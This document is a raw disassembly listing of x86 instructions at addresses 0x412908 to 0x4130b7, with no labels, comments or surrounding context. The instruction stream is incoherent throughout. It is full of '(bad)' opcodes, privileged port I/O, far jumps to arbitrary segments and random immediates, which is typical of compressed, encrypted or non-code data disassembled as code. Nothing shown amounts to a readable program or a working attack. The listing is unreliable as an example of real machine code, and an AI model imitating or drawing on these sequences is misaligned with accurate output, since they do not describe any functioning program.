  412908:	std    
  412909:	jmp    0xbf3c:0x41664f12
  412910:	jg     0x41296d
  412912:	push   eax
  412913:	stos   BYTE PTR es:[edi],al
  412914:	sub    ecx,DWORD PTR [ecx+0x68eea4e1]
  41291a:	mov    al,ds:0x7bc31eef
  41291f:	stos   DWORD PTR es:[edi],eax
  412920:	test   DWORD PTR [edi-0x1e6316d],esp
  412926:	mov    ch,0x5a
  412928:	sbb    eax,0x34542d4
  41292d:	cmp    eax,0x35e8b7b3
  412932:	ss pusha 
  412934:	retf   
  412935:	imul   eax,DWORD PTR [esi-0x56],0xf59d76b9
  41293c:	or     edi,DWORD PTR [ebx+0x3f0cfd6f]
  412942:	call   0xebaf60a8
  412947:	mov    ecx,0x62be2fa9
  41294c:	inc    edx
  41294d:	rcr    ah,1
  41294f:	xor    ah,BYTE PTR [eax-0x31]
  412952:	xchg   edi,eax
  412953:	das    
  412954:	rol    DWORD PTR [edi-0x25],1
  412957:	sbb    al,0xd2
  412959:	ins    DWORD PTR es:[edi],dx
  41295a:	and    DWORD PTR [edx-0x1a302ae2],ebx
  412960:	ins    DWORD PTR es:[edi],dx
  412961:	jne    0x412972
  412963:	sub    ah,al
  412965:	(bad)  
  412966:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412967:	push   esi
  412968:	jmp    0x192a:0x2959cc0b
  41296f:	es push 0x2867552e
  412975:	fwait
  412976:	(bad)  
  412977:	test   eax,0xd3f75f42
  41297c:	pop    edx
  41297d:	les    edi,FWORD PTR [edx]
  41297f:	jnp    0x4129e6
  412981:	xor    cl,dl
  412983:	and    BYTE PTR [ecx+0x24093f25],dh
  412989:	out    0xf7,al
  41298b:	std    
  41298c:	out    0x1,eax
  41298e:	mov    edx,0x4a460cd2
  412993:	ficom  DWORD PTR [ebp+0x6270f0a3]
  412999:	pop    ss
  41299a:	call   0xf661:0x37bc2bdb
  4129a1:	mov    WORD PTR [esi],cs
  4129a3:	mov    dl,0xc5
  4129a5:	mov    ebx,0x9f2a568e
  4129aa:	aad    0xb6
  4129ac:	push   cs
  4129ad:	ret    0xeb1c
  4129b0:	sub    BYTE PTR [edx+0x27],0xa0
  4129b4:	rol    BYTE PTR [edx-0x6e],0x79
  4129b8:	das    
  4129b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4129ba:	mov    ebp,0x72adeb50
  4129bf:	aaa    
  4129c0:	cmp    DWORD PTR [eax-0x223545c],ebp
  4129c6:	scas   eax,DWORD PTR es:[edi]
  4129c7:	jge    0x4129c1
  4129c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129ca:	ins    BYTE PTR es:[edi],dx
  4129cb:	cwde   
  4129cc:	repz icebp 
  4129ce:	shl    DWORD PTR [esi-0x20ea021e],cl
  4129d4:	lods   eax,DWORD PTR ds:[esi]
  4129d5:	lds    eax,FWORD PTR [ebx-0x264229eb]
  4129db:	not    DWORD PTR [edi]
  4129dd:	sbb    DWORD PTR [edx-0x5338ba88],edx
  4129e3:	fs push eax
  4129e5:	fsubr  DWORD PTR [ecx+0x7b]
  4129e8:	rcr    DWORD PTR [edi-0x7c1eb95a],0x5e
  4129ef:	test   ebp,ebp
  4129f1:	les    edx,FWORD PTR [edi]
  4129f3:	cmp    eax,0x1a504730
  4129f8:	icebp  
  4129f9:	das    
  4129fa:	xchg   DWORD PTR [ebx],ebx
  4129fc:	dec    eax
  4129fd:	jle    0x412a31
  4129ff:	rol    BYTE PTR [esi-0x534a3856],0xa8
  412a06:	inc    edi
  412a07:	fcmovnu st,st(1)
  412a09:	and    BYTE PTR [ebx-0x4c],bh
  412a0c:	push   cs
  412a0d:	cli    
  412a0e:	add    dh,ah
  412a10:	mov    esp,0x7ec0e8dd
  412a15:	inc    edx
  412a16:	stos   BYTE PTR es:[edi],al
  412a17:	or     eax,0x6486ec9
  412a1c:	jg     0x412a26
  412a1e:	popa   
  412a1f:	bound  edx,QWORD PTR [ebx]
  412a21:	(bad)  
  412a22:	jmp    0x3316:0x3f163c12
  412a29:	xchg   esp,eax
  412a2a:	(bad)  
  412a2b:	je     0x412aac
  412a2d:	xor    BYTE PTR [esi],cl
  412a2f:	aas    
  412a30:	and    DWORD PTR [esi-0x6e4d93e2],0xa8178df1
  412a3a:	(bad)  
  412a3b:	and    BYTE PTR [ebx-0x6bb733c7],bh
  412a41:	test   DWORD PTR [edx-0x631f9e4],esi
  412a47:	clc    
  412a48:	call   0xa004b2cd
  412a4d:	sti    
  412a4e:	ffreep st(5)
  412a50:	stc    
  412a51:	dec    eax
  412a52:	loopne 0x412a3a
  412a54:	adc    ah,BYTE PTR [ebx]
  412a56:	sub    esp,ecx
  412a58:	jns    0x412ac8
  412a5a:	pop    ebp
  412a5b:	add    al,0xad
  412a5d:	dec    esp
  412a5e:	clc    
  412a5f:	add    eax,0x699f249c
  412a64:	jl     0x4129ef
  412a66:	mov    cl,0x4f
  412a68:	sbb    bl,BYTE PTR [edx]
  412a6a:	ds sbb al,0x3b
  412a6d:	hlt    
  412a6e:	scas   eax,DWORD PTR es:[edi]
  412a6f:	stc    
  412a70:	mov    WORD PTR [ebx+0x5e22595],?
  412a76:	and    dh,BYTE PTR [edi+0x65]
  412a79:	add    BYTE PTR [ebx+0x22],ch
  412a7c:	stc    
  412a7d:	call   0x23033a04
  412a82:	jge    0x412a83
  412a84:	xor    BYTE PTR [edx],dl
  412a86:	pop    ecx
  412a87:	dec    eax
  412a88:	int    0xd3
  412a8a:	addr16 xor eax,0xfdd1f0ec
  412a90:	fldcw  WORD PTR ds:0xf69b100
  412a96:	cmp    DWORD PTR [ebx],edi
  412a98:	or     DWORD PTR [ebx-0x65390f86],esp
  412a9e:	cdq    
  412a9f:	xchg   ebp,eax
  412aa0:	add    BYTE PTR [ebp+0x207072cb],al
  412aa6:	nop
  412aa7:	fcom   QWORD PTR [esi+0x7f]
  412aaa:	mov    eax,0x6c35d496
  412aaf:	push   esp
  412ab0:	daa    
  412ab1:	mov    ebx,0x8397cf8e
  412ab6:	push   esi
  412ab7:	sbb    ebx,DWORD PTR [esi]
  412ab9:	sub    esp,DWORD PTR [eax]
  412abb:	mov    WORD PTR [ebp+0x1e684fcf],ds
  412ac1:	add    dl,BYTE PTR [ebp+0x48bc3260]
  412ac7:	xor    ecx,DWORD PTR [ebp-0x31e9983c]
  412acd:	add    DWORD PTR [ebx+0x5dbd9936],ecx
  412ad3:	aaa    
  412ad4:	je     0x412a73
  412ad6:	jbe    0x412a81
  412ad8:	popa   
  412ad9:	pop    esi
  412ada:	dec    esp
  412adb:	test   BYTE PTR [ebp+0x5432d475],al
  412ae1:	xor    ebp,DWORD PTR [ecx+ecx*1]
  412ae4:	or     bl,cl
  412ae6:	dec    eax
  412ae7:	mov    dl,0x5b
  412ae9:	outs   dx,BYTE PTR ds:[esi]
  412aea:	(bad)  
  412aeb:	fild   DWORD PTR [ebx+0x569ee9ee]
  412af1:	add    DWORD PTR [edx-0x30],edi
  412af4:	mov    gs,WORD PTR [esp+ebp*1+0x27d78ff8]
  412afb:	push   ss
  412afc:	sub    ch,ah
  412afe:	pop    ds
  412aff:	es mov ds,ecx
  412b02:	sbb    DWORD PTR [esi+0x49],esp
  412b05:	and    ebx,DWORD PTR [eax]
  412b07:	sar    BYTE PTR [ecx-0x67],1
  412b0a:	mov    DWORD PTR [ebp+0x6386ddf5],esi
  412b10:	push   edx
  412b11:	mov    cl,0xcd
  412b13:	mov    cs,WORD PTR [ebx-0x16]
  412b16:	xor    ebx,DWORD PTR [eax-0x69]
  412b19:	cld    
  412b1a:	push   esp
  412b1b:	xchg   esi,eax
  412b1c:	add    edx,DWORD PTR [esi-0x1180a195]
  412b22:	and    BYTE PTR [esi-0x5940a2d9],al
  412b28:	pop    esp
  412b29:	lock jae 0x412b86
  412b2c:	dec    eax
  412b2d:	mov    ds:0x678f71f0,al
  412b32:	iret   
  412b33:	mov    ebx,0xdcbe44ca
  412b38:	popf   
  412b39:	and    al,BYTE PTR [ebx+0x18d5d929]
  412b3f:	lock mov eax,0x53920314
  412b45:	mov    ds:0xd7147949,al
  412b4a:	fisub  DWORD PTR [eax]
  412b4c:	outs   dx,WORD PTR ds:[esi]
  412b4e:	inc    BYTE PTR [edx+0x42d18a31]
  412b54:	add    BYTE PTR [edx-0x28c91b26],dl
  412b5a:	scas   eax,DWORD PTR es:[edi]
  412b5b:	enter  0x46,0xd6
  412b5f:	fs mov ecx,0x49340737
  412b65:	mov    edx,DWORD PTR [ecx-0x34]
  412b68:	inc    edi
  412b69:	mov    WORD PTR [ebp-0x43e25afa],bp
  412b70:	out    0xc6,al
  412b72:	sbb    eax,edi
  412b74:	(bad)  
  412b75:	pusha  
  412b76:	or     DWORD PTR [edi+esi*4],esi
  412b79:	aas    
  412b7a:	mov    cs,ebx
  412b7c:	popf   
  412b7d:	iret   
  412b7e:	mov    cl,0x32
  412b80:	imul   eax,DWORD PTR [ebx+eax*1],0x12
  412b84:	inc    eax
  412b85:	je     0x412b2e
  412b87:	fs cmp al,0x0
  412b8a:	add    eax,DWORD PTR [esi-0x67]
  412b8d:	jle    0x412b91
  412b8f:	sub    eax,0xba76e426
  412b94:	sbb    eax,0xbcc28709
  412b99:	mov    al,0xd1
  412b9b:	sub    al,0x5
  412b9d:	imul   ebp,DWORD PTR [esi+0x79],0x8917d23c
  412ba4:	push   ss
  412ba5:	and    esp,DWORD PTR [eax-0x346695b7]
  412bab:	add    BYTE PTR [ecx+0xe5fc10a],0xf3
  412bb2:	popa   
  412bb3:	sbb    al,0x6c
  412bb5:	jae    0x412be3
  412bb7:	bound  esp,QWORD PTR [esi-0x580383ba]
  412bbd:	je     0x412bb3
  412bbf:	ret    
  412bc0:	stos   BYTE PTR es:[edi],al
  412bc1:	call   0x9983:0x598d0e89
  412bc8:	fidivr WORD PTR ds:0x14ececd
  412bce:	xor    edi,ebp
  412bd0:	arpl   WORD PTR [ebx],dx
  412bd2:	(bad)  
  412bd3:	mov    BYTE PTR [ecx-0x76],ah
  412bd6:	stc    
  412bd7:	das    
  412bd8:	push   esi
  412bd9:	mov    WORD PTR [esp+edx*2+0x22c09031],fs
  412be0:	add    eax,0xa01097d5
  412be5:	idiv   BYTE PTR [ecx-0x61c4280]
  412beb:	jb     0x412b94
  412bed:	cld    
  412bee:	jcxz   0x412b7c
  412bf1:	xchg   esi,eax
  412bf2:	push   ecx
  412bf3:	bound  ebp,QWORD PTR [edi+0x767960e2]
  412bf9:	ins    DWORD PTR es:[edi],dx
  412bfa:	sbb    eax,0xda37d2d4
  412bff:	ror    dh,cl
  412c01:	adc    eax,0x71095f17
  412c06:	add    eax,0x835ebcde
  412c0b:	sbb    dh,al
  412c0d:	inc    edi
  412c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c0f:	loope  0x412bf4
  412c11:	hlt    
  412c12:	mov    al,ds:0xa3278921
  412c17:	cmc    
  412c18:	dec    esi
  412c19:	pop    ds
  412c1a:	leave  
  412c1b:	inc    ebp
  412c1c:	adc    BYTE PTR [ebx],cl
  412c1e:	mov    bl,0xd7
  412c20:	mov    bl,0xa2
  412c22:	mov    bh,0x5d
  412c24:	or     BYTE PTR [eax-0x50],0x92
  412c28:	retf   
  412c29:	fsub   st(0),st
  412c2b:	cwde   
  412c2c:	lods   eax,DWORD PTR ds:[esi]
  412c2d:	data16 icebp 
  412c2f:	add    DWORD PTR [ebp-0x7e],edi
  412c32:	pushf  
  412c33:	jo     0x412c96
  412c35:	pusha  
  412c36:	fdivr  QWORD PTR [ebx+0x70]
  412c39:	sub    eax,0x1bc4b1bf
  412c3e:	mov    esi,0xec7b3d28
  412c43:	rcl    DWORD PTR [ecx-0x67cf4cd0],cl
  412c49:	jbe    0x412c96
  412c4b:	hlt    
  412c4c:	(bad)  [esi]
  412c4e:	cdq    
  412c4f:	mov    dl,0x72
  412c51:	and    al,0xa7
  412c53:	out    0x2,al
  412c55:	xchg   edi,eax
  412c56:	aad    0x66
  412c58:	es mov cl,BYTE PTR gs:[ebx-0x7a]
  412c5d:	jge    0x412cbc
  412c5f:	xchg   esi,eax
  412c60:	fimul  DWORD PTR fs:[edx]
  412c63:	pop    esi
  412c64:	retf   0xacb7
  412c67:	sahf   
  412c68:	fs and dl,dl
  412c6b:	adc    eax,DWORD PTR [esi]
  412c6d:	bound  ecx,QWORD PTR [ecx+0x7a]
  412c70:	mov    esp,0xaaca804d
  412c75:	imul   esi,DWORD PTR [ecx],0xffffffbe
  412c78:	outs   dx,DWORD PTR ds:[esi]
  412c79:	jbe    0x412cc3
  412c7b:	inc    ebx
  412c7c:	inc    eax
  412c7d:	jge    0x412cb6
  412c7f:	daa    
  412c80:	inc    esp
  412c81:	jle    0x412c11
  412c83:	push   ss
  412c84:	xor    eax,0xb4451a8b
  412c89:	inc    DWORD PTR [ebp+0x30da293]
  412c8f:	pop    edi
  412c90:	pop    ecx
  412c91:	test   DWORD PTR [edx+0x12],edi
  412c94:	sub    ah,BYTE PTR [edi+eax*8+0x48]
  412c98:	add    DWORD PTR [edx+0x8],esi
  412c9b:	out    dx,eax
  412c9c:	xor    ch,ah
  412c9e:	push   edi
  412c9f:	pusha  
  412ca0:	and    ecx,ecx
  412ca2:	sahf   
  412ca3:	jmp    0x412c4c
  412ca5:	jns    0x412ce1
  412ca7:	jg     0x412c3c
  412ca9:	(bad)  
  412caa:	stos   BYTE PTR es:[edi],al
  412cab:	inc    ecx
  412cac:	std    
  412cad:	push   es
  412cae:	lods   eax,DWORD PTR ds:[esi]
  412caf:	ins    DWORD PTR es:[edi],dx
  412cb0:	cld    
  412cb1:	loope  0x412c8c
  412cb3:	and    al,0x3a
  412cb5:	fidivr WORD PTR [ebx]
  412cb7:	fs xchg edx,eax
  412cb9:	ret    
  412cba:	mov    dl,BYTE PTR [esi+0x7b6c022a]
  412cc0:	js     0x412d02
  412cc2:	push   ebx
  412cc3:	out    0xf2,eax
  412cc5:	daa    
  412cc6:	mov    cl,0x51
  412cc8:	cs xchg esi,eax
  412cca:	add    DWORD PTR [ecx-0x71],ecx
  412ccd:	sbb    ebx,DWORD PTR [edx-0x2b]
  412cd0:	pop    esi
  412cd1:	inc    ebp
  412cd2:	(bad)  
  412cd3:	hlt    
  412cd4:	xchg   edx,eax
  412cd5:	push   ecx
  412cd6:	into   
  412cd7:	call   DWORD PTR [ebx+0x78515aef]
  412cdd:	nop
  412cde:	pushf  
  412cdf:	jae    0x412cc4
  412ce1:	mov    esi,0x58d1029e
  412ce6:	stos   DWORD PTR es:[edi],eax
  412ce7:	pop    esi
  412ce8:	aad    0x10
  412cea:	ud0    ebp,esi
  412ced:	cmp    eax,0xb912f830
  412cf2:	adc    DWORD PTR [ecx-0x3d],ebx
  412cf5:	dec    esi
  412cf6:	or     bl,BYTE PTR [edx-0x2c24891e]
  412cfc:	imul   ebp,DWORD PTR [ecx+0x4f],0x7f4ee215
  412d03:	push   eax
  412d04:	inc    ecx
  412d05:	pop    esi
  412d06:	inc    edx
  412d07:	add    ebx,DWORD PTR [ecx]
  412d09:	pusha  
  412d0a:	sbb    eax,DWORD PTR [edx]
  412d0c:	(bad)  
  412d0d:	fdivr  QWORD PTR [ebx+0x5857099d]
  412d13:	inc    ecx
  412d14:	pop    esp
  412d15:	dec    ebp
  412d16:	or     al,0xb8
  412d18:	pop    ebp
  412d19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d1a:	xchg   edx,eax
  412d1b:	pushf  
  412d1c:	retf   0xe543
  412d1f:	scas   al,BYTE PTR es:[edi]
  412d20:	mov    al,0xf7
  412d22:	and    BYTE PTR [edi-0x67b90862],dl
  412d28:	xor    BYTE PTR [ebp+0x76],cl
  412d2b:	repnz aaa 
  412d2d:	nop
  412d2e:	mov    esp,0x71438173
  412d33:	arpl   WORD PTR [ebx-0x2ebf9d7f],di
  412d39:	pop    ds
  412d3a:	retf   0x5977
  412d3d:	fimul  WORD PTR [ecx]
  412d3f:	xlat   BYTE PTR ds:[ebx]
  412d40:	ja     0x412da7
  412d42:	jp     0x412d15
  412d44:	test   ch,dl
  412d46:	push   0xffffffea
  412d48:	in     eax,dx
  412d49:	push   es
  412d4a:	inc    esp
  412d4b:	stos   DWORD PTR es:[edi],eax
  412d4c:	dec    ecx
  412d4d:	je     0x412daa
  412d4f:	xor    dh,bh
  412d51:	push   0xdd155940
  412d56:	cmc    
  412d57:	push   edx
  412d58:	cwde   
  412d59:	adc    edi,DWORD PTR ds:0x91a5680a
  412d5f:	pop    esp
  412d60:	and    DWORD PTR [ecx-0x7f],esp
  412d63:	cwde   
  412d64:	in     eax,0xef
  412d66:	and    BYTE PTR [esi-0x22f2e316],ch
  412d6c:	int3   
  412d6d:	push   esp
  412d6e:	xor    al,0xde
  412d70:	xchg   ebp,eax
  412d71:	stc    
  412d72:	push   esp
  412d73:	scas   eax,DWORD PTR es:[edi]
  412d74:	je     0x412d0a
  412d76:	cmp    eax,DWORD PTR [edx+0x14]
  412d79:	fsubr  DWORD PTR [eax]
  412d7b:	out    0x82,al
  412d7d:	(bad)  
  412d7e:	add    ebp,DWORD PTR [ebp+0x1756fcda]
  412d84:	dec    ecx
  412d85:	rol    BYTE PTR [eax+0x34b6b84],cl
  412d8b:	push   ds
  412d8c:	push   ss
  412d8d:	clc    
  412d8e:	pop    ds
  412d8f:	(bad)  
  412d90:	(bad)  
  412d91:	out    0x7,al
  412d93:	mov    eax,DWORD PTR [eax+0x6693c821]
  412d99:	fstp   DWORD PTR [ecx-0x52]
  412d9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d9d:	push   eax
  412d9e:	cmp    BYTE PTR [edx],al
  412da0:	inc    BYTE PTR [edx-0x6e]
  412da3:	pop    es
  412da4:	dec    ebp
  412da5:	push   eax
  412da6:	shl    BYTE PTR [esi],0x6f
  412da9:	jp     0x412d56
  412dab:	mov    edx,0xf723d8f0
  412db0:	push   esp
  412db1:	test   al,0x80
  412db3:	jns    0x412da9
  412db5:	js     0x412dce
  412db7:	pusha  
  412db8:	stos   BYTE PTR es:[edi],al
  412db9:	or     edx,DWORD PTR [esi+edi*4]
  412dbc:	arpl   WORD PTR [ebx-0xc4b8ee4],bx
  412dc2:	not    eax
  412dc4:	pop    eax
  412dc6:	mov    esp,0x4afa261a
  412dcb:	repnz mov edx,0x5bd8118a
  412dd1:	cld    
  412dd2:	std    
  412dd3:	frstor [esi]
  412dd5:	mov    al,ds:0x1a4b172e
  412dda:	mov    edx,0xb402030
  412ddf:	or     BYTE PTR [eax-0x15dee429],ch
  412de5:	and    al,0xe9
  412de7:	pop    esp
  412de8:	push   ebp
  412de9:	adc    DWORD PTR [edi+0x38],edx
  412dec:	jmp    0x5d17:0x42ad3de1
  412df3:	arpl   bx,si
  412df5:	or     DWORD PTR [eax-0x669d83b1],ebx
  412dfb:	(bad)  
  412dfc:	push   esi
  412dfd:	les    esi,FWORD PTR [eax-0x738b18cc]
  412e03:	jecxz  0x412da2
  412e05:	sub    BYTE PTR [esi],bl
  412e07:	add    bl,BYTE PTR [edx]
  412e09:	sbb    al,0xca
  412e0b:	and    BYTE PTR [edx-0x22db546d],0x2b
  412e12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e13:	mov    ebp,0x47441af1
  412e18:	in     eax,0xb0
  412e1a:	mov    DWORD PTR [edx+0x1d25eb3b],ecx
  412e20:	into   
  412e21:	pop    edi
  412e22:	sub    BYTE PTR [ebx-0x2b],ch
  412e25:	test   al,0x8d
  412e27:	push   ebx
  412e28:	sbb    esi,edi
  412e2a:	test   BYTE PTR [esp+eax*1+0x5aa9f336],dh
  412e31:	(bad)  
  412e32:	xchg   edx,eax
  412e33:	inc    edi
  412e34:	pop    ebp
  412e35:	cs cmc 
  412e37:	mov    bl,0x71
  412e39:	sar    DWORD PTR [eax-0x1b3100c4],0x86
  412e40:	(bad)  
  412e41:	dec    ebx
  412e42:	stc    
  412e43:	(bad)  
  412e44:	dec    edi
  412e45:	or     eax,ebx
  412e47:	add    DWORD PTR [ebx-0x2df5563b],ecx
  412e4d:	xlat   BYTE PTR ds:[ebx]
  412e4e:	xchg   edx,eax
  412e4f:	mov    ecx,0x5d358ad5
  412e54:	pop    esi
  412e55:	jmp    0x412e96
  412e57:	push   edx
  412e58:	nop
  412e59:	xor    cl,al
  412e5b:	rol    BYTE PTR [ecx+ecx*2-0x6e],1
  412e5f:	inc    edi
  412e60:	pusha  
  412e61:	mov    ecx,0x7c4a2f6a
  412e66:	clc    
  412e67:	jnp    0x412e57
  412e69:	push   0xf0dce62e
  412e6e:	int3   
  412e6f:	mov    esi,0x686a5375
  412e74:	pop    es
  412e75:	jg     0x412e92
  412e77:	pop    ebx
  412e78:	fidiv  WORD PTR [ebx-0x34]
  412e7b:	cmp    BYTE PTR es:[edx-0x47b0c206],bl
  412e82:	jmp    0xa1eb:0xe7d69837
  412e89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e8a:	ins    DWORD PTR es:[edi],dx
  412e8b:	or     BYTE PTR ds:0x34946c80,0xa
  412e92:	bound  esi,QWORD PTR [esi-0x7]
  412e95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e96:	jp     0x412eb6
  412e98:	loopne 0x412ef0
  412e9a:	sub    ecx,DWORD PTR [edi+0x36]
  412e9d:	jle    0x412eb4
  412e9f:	loope  0x412eb1
  412ea1:	fidivr WORD PTR ds:0xa6c374ca
  412ea7:	retf   0x491
  412eaa:	int3   
  412eab:	loopne 0x412ecc
  412ead:	pop    eax
  412eae:	nop
  412eaf:	rcl    DWORD PTR ds:0xb7bb7e62,0xf
  412eb6:	cmp    ebp,esi
  412eb8:	loope  0x412eb4
  412eba:	mov    esp,0x1e873b64
  412ebf:	jae    0x412f36
  412ec1:	xchg   edx,eax
  412ec2:	and    esi,eax
  412ec4:	cmc    
  412ec5:	mov    ah,0xb
  412ec7:	(bad)  
  412ec8:	stos   DWORD PTR es:[edi],eax
  412ec9:	aas    
  412eca:	mov    cl,0x37
  412ecc:	iret   
  412ecd:	cld    
  412ece:	sahf   
  412ecf:	mov    dl,0x21
  412ed1:	lods   al,BYTE PTR ds:[esi]
  412ed2:	mov    eax,0x97daf1b9
  412ed7:	fs mov esp,0x7e5854bb
  412edd:	mov    esp,0x33f63a78
  412ee2:	int    0xbe
  412ee4:	je     0x412f45
  412ee6:	popa   
  412ee7:	xor    DWORD PTR [esi],ebx
  412ee9:	leave  
  412eea:	xor    BYTE PTR [ebx+0x29e2b821],ch
  412ef0:	add    BYTE PTR [ecx+0x2cd247ae],ch
  412ef6:	lods   eax,DWORD PTR ds:[esi]
  412ef7:	loopne 0x412ee6
  412ef9:	jne    0x412e86
  412efb:	and    al,0x43
  412efd:	pop    esi
  412efe:	les    esi,FWORD PTR [edx]
  412f00:	mov    ds:0x506c7ed6,eax
  412f05:	mov    al,ds:0x8d56a3e5
  412f0a:	retf   0xddce
  412f0d:	adc    dl,bl
  412f0f:	dec    esp
  412f10:	mov    esi,0x8a21953f
  412f15:	inc    esp
  412f16:	pop    esi
  412f17:	add    esi,ebp
  412f19:	retf   
  412f1a:	inc    ebp
  412f1b:	(bad)
  412f1e:	mov    WORD PTR ds:0xca0ba7a2,?
  412f24:	mov    ch,0x98
  412f26:	into   
  412f27:	leave  
  412f28:	aaa    
  412f29:	lods   al,BYTE PTR ds:[esi]
  412f2a:	adc    al,0x93
  412f2c:	div    BYTE PTR [edi]
  412f2e:	xor    dh,BYTE PTR [eax-0x38470d57]
  412f34:	arpl   WORD PTR [esi-0x47],ax
  412f37:	jecxz  0x412ece
  412f39:	adc    cl,cl
  412f3b:	in     al,dx
  412f3c:	mov    edx,0x1e837e69
  412f41:	stos   BYTE PTR es:[edi],al
  412f42:	sbb    ch,dh
  412f44:	push   DWORD PTR [esi-0x1a2efc6e]
  412f4a:	xchg   dl,cl
  412f4c:	lock mov eax,ds:0xad5bd967
  412f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f53:	xor    eax,esp
  412f55:	mov    dl,0x6b
  412f57:	int3   
  412f58:	scas   al,BYTE PTR es:[edi]
  412f59:	loope  0x412f39
  412f5b:	out    dx,al
  412f5c:	xchg   esi,eax
  412f5d:	int3   
  412f5e:	adc    DWORD PTR [ebp+0x6e],esi
  412f61:	xchg   BYTE PTR [esi+0x542a4912],cl
  412f67:	xchg   ebp,eax
  412f68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f69:	daa    
  412f6a:	hlt    
  412f6b:	test   ch,ch
  412f6d:	loope  0x412f5f
  412f6f:	mov    dh,0x1c
  412f71:	mov    gs,WORD PTR [ecx-0xa7e88c2]
  412f77:	leave  
  412f78:	mov    esi,0xb7d464c6
  412f7d:	cld    
  412f7e:	lea    esp,[edi+eax*4-0x3690987]
  412f85:	push   ebx
  412f86:	(bad)  
  412f87:	arpl   WORD PTR ds:0x264bfd85,bx
  412f8d:	push   ebp
  412f8e:	call   0x9664:0x187583bc
  412f95:	jp     0x412fa6
  412f97:	mov    DWORD PTR [esi-0x117d1b14],ebx
  412f9d:	lock in eax,0x52
  412fa0:	lahf   
  412fa1:	ja     0x412f51
  412fa3:	xor    bh,BYTE PTR [eax+0x65]
  412fa6:	jecxz  0x412fcd
  412fa8:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  412faa:	pop    ss
  412fab:	jl     0x412fcf
  412fad:	and    eax,0x95b14c4f
  412fb2:	add    esi,DWORD PTR [edi-0x80]
  412fb5:	js     0x412f41
  412fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fb8:	ffree  st(4)
  412fba:	fwait
  412fbb:	pop    edi
  412fbc:	push   edx
  412fbd:	iret   
  412fbe:	mov    ah,0xa0
  412fc0:	fistp  WORD PTR [eax-0x29]
  412fc3:	loope  0x412fec
  412fc5:	inc    edi
  412fc6:	or     al,0x76
  412fc8:	push   ebx
  412fc9:	xchg   ebx,eax
  412fca:	pop    edi
  412fcb:	aaa    
  412fcc:	sbb    DWORD PTR cs:[edx],esi
  412fcf:	popf   
  412fd0:	xlat   BYTE PTR ds:[ebx]
  412fd1:	leave  
  412fd2:	sahf   
  412fd3:	and    ch,cl
  412fd5:	jmp    0x2251e30c
  412fda:	enter  0x8535,0xe2
  412fde:	dec    ebp
  412fdf:	sbb    al,0xb1
  412fe1:	loopne 0x412f9c
  412fe3:	ins    DWORD PTR es:[edi],dx
  412fe4:	jb     0x412fab
  412fe6:	icebp  
  412fe7:	jmp    0xeed3:0x14541cb4
  412fee:	cli    
  412fef:	test   dl,bh
  412ff1:	std    
  412ff2:	(bad)  
  412ff3:	push   edi
  412ff4:	retf   
  412ff5:	add    bl,BYTE PTR [ebp-0x2d]
  412ff8:	push   ecx
  412ff9:	iret   
  412ffa:	sbb    esp,DWORD PTR [edx]
  412ffc:	push   esp
  412ffd:	or     DWORD PTR [esi+0x583f6ef8],eax
  413003:	arpl   WORD PTR [edx-0x3ef4d4d8],cx
  413009:	sub    BYTE PTR [ecx-0x7e5e9bc6],al
  41300f:	sar    DWORD PTR [ecx-0x38],cl
  413012:	sahf   
  413013:	dec    edx
  413014:	loop   0x412fd6
  413016:	sub    DWORD PTR [ebp+0x5cc566a4],esp
  41301c:	mov    dl,0x47
  41301e:	xlat   BYTE PTR ds:[ebx]
  41301f:	inc    esi
  413020:	(bad)  
  413021:	mov    al,0x6c
  413023:	out    dx,al
  413024:	nop
  413025:	add    al,0x6a
  413027:	jae    0x413028
  413029:	mov    BYTE PTR [ebp+edx*2+0x52],bl
  41302d:	jp     0x41303f
  41302f:	std    
  413030:	imul   edx,DWORD PTR [ebx+0x57],0x80c5d6c8
  413037:	out    0x8c,al
  413039:	aam    0xe1
  41303b:	mov    esi,0x37b65e7b
  413040:	inc    esi
  413041:	enter  0xb6b8,0x29
  413045:	pop    ebp
  413046:	inc    esi
  413047:	cmp    dl,bl
  413049:	pop    ds
  41304a:	stc    
  41304b:	(bad)  
  41304c:	ds push ss
  41304e:	hlt    
  41304f:	and    BYTE PTR [edx],dl
  413051:	rol    BYTE PTR [ecx+0x6e],0x50
  413055:	xor    DWORD PTR [eax+ecx*2],ecx
  413058:	cmp    dh,BYTE PTR ds:0xf47737d4
  41305e:	test   BYTE PTR [ecx],cl
  413060:	ins    DWORD PTR es:[edi],dx
  413061:	mov    al,0x67
  413063:	fiadd  WORD PTR [edi+ebx*1-0x5d4691ca]
  41306a:	xor    BYTE PTR [edi],bl
  41306c:	jge    0x4130ca
  41306e:	lds    esi,FWORD PTR [edx]
  413070:	ins    BYTE PTR es:[edi],dx
  413071:	xor    DWORD PTR [edi],0x3e1ab890
  413077:	pusha  
  413078:	fwait
  413079:	and    eax,DWORD PTR [eax+ecx*2-0x26]
  41307d:	cmp    BYTE PTR ds:0xa82155b7,0x69
  413084:	ret    
  413085:	test   DWORD PTR [ecx],eax
  413087:	jge    0x5095cd1f
  41308d:	and    BYTE PTR [edi],dh
  41308f:	aaa    
  413090:	jmp    DWORD PTR [edx]
  413092:	imul   ebp,DWORD PTR [ecx-0x30bb6665],0x3d
  413099:	or     ch,dh
  41309b:	mov    ch,0x15
  41309d:	nop
  41309e:	inc    ecx
  41309f:	js     0x41303f
  4130a1:	(bad)  
  4130a2:	jp     0x413090
  4130a4:	xor    dh,0xcf
  4130a7:	or     bl,BYTE PTR [ebp+0x3c]
  4130aa:	(bad)  
  4130ab:	pop    edi
  4130ac:	out    dx,eax
  4130ad:	popf   
  4130ae:	sub    al,0xe5
  4130b0:	loopne 0x41311f
  4130b2:	push   cs
  4130b3:	mov    DWORD PTR [esp+ebx*4],ecx
  4130b6:	lahf   
  4130b7:	nop
